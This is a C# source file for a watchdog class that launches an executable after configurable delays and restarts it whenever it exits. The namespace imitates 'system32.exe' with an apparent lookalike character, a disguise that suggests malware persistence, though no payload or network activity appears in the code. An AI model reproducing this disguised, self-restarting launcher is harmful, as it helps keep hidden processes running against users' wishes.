using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace systеm32.exe.Models
{
    public class ProcessListener : IListener
    {
        private readonly string _fileName;
        private readonly string _configPath;
        private readonly bool _isServer;
        private readonly DispatcherTimer _watcher;
        private Process _currentProcess;
        private double _timeoutInSeconds;
        private readonly string _settingsPath;

        public ProcessListener(string fileName,
                               string configPath,
                               bool isServer)
        {
            _settingsPath = ConfigurationManager
                .OpenExeConfiguration
                (
                    ConfigurationUserLevel.PerUserRoamingAndLocal
                )
                .FilePath;
            _fileName = fileName;
            _configPath = configPath;
            _isServer = isServer;
            _watcher = new DispatcherTimer(DispatcherPriority.Normal)
            {
                Interval = TimeSpan.FromMilliseconds
                (
                    TimeSpan.FromSeconds
                    (
                        Properties.Settings.Default.ProcessCheckTimeoutInSeconds
                    ).TotalMilliseconds
                )
            };
            _watcher.Tick += KeepChildProcess;
        }

        private void KeepChildProcess(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.DoNotRunAgain)
            {
                return;
            }
            if (_currentProcess.HasExited)
            {
                InitializeChildProcess();
            }
        }

        public void StartListening()
        {
            InitializeChildProcess();
        }

        private void InitializeChildProcess()
        {
            if (Properties.Settings.Default.IsRunForFirstTime)
            {
                Properties.Settings.Default.IsRunForFirstTime = false;
                Properties.Settings.Default.Save();
                Thread.Sleep(Convert.ToInt32(TimeSpan.FromSeconds(Properties.Settings.Default.FirstRunTimeoutInSeconds).TotalMilliseconds));
                _currentProcess = Process.Start(GetPath(), Properties.Settings.Default.FirstRunArgs);
            }
            else
            {
                _timeoutInSeconds = Properties.Settings.Default.SecondRunTimeoutInSeconds;
                Thread.Sleep(Convert.ToInt32(TimeSpan.FromSeconds(Properties.Settings.Default.SecondRunTimeoutInSeconds).TotalMilliseconds));
                _currentProcess = Process.Start(GetPath(), Properties.Settings.Default.SecondRunArgs);
            }
            _watcher.Start();
        }

        private string GetPath()
        {
            return Path.Combine(AppDomain.CurrentDomain.BaseDirectory, _fileName);
        }

        public void StopListening()
        {
            _currentProcess.Kill();
        }
    }
}
